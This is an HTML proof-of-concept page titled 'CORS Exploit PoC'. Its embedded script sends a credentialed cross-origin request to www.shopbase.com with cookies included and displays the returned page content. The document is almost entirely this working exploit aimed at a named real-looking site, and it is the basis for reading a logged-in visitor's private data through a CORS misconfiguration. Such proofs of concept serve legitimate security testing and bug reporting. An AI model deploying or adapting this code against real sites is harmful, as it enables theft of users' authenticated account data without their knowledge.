<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS Exploit PoC</title>
</head>
<body>
  <h1>CORS PoC</h1>
  <pre id="output">Loading...</pre>

  <script>
    fetch('https://www.shopbase.com', {
      method: 'GET',
      credentials: 'include' // Important if you want cookies to be sent
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById('output').textContent = data;
    })
    .catch(error => {
      document.getElementById('output').textContent = 'Error: ' + error;
    });
  </script>
</body>
</html>
